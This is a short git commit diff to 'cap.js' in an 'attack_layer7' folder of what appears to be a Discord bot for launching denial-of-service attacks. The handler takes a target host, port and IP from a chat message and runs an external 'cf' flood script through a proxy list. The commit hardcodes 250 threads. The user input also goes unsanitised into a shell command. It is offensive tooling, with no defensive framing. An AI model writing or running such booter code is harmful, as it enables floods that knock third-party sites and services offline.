2f009297772f4c3f3ae7431d25845ad057fe3131
apaple <76417012+apaple@users.noreply.github.com>
2022-11-25 15:45:32 +0700

    Update cap.js

--- attack_layer7/cap.js
+++ attack_layer7/cap.js
@@ -4,8 +4,7 @@ exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
 const port = message.content.split (" ")[2]
-const thread = message.content.split (" ")[3]
-const reqip = message.content.split (" ")[4]
+const reqip = message.content.split (" ")[3]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -26,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cf ${host} ${port} ${thread} GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
+exec(`node cf ${host} ${port} 250 GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
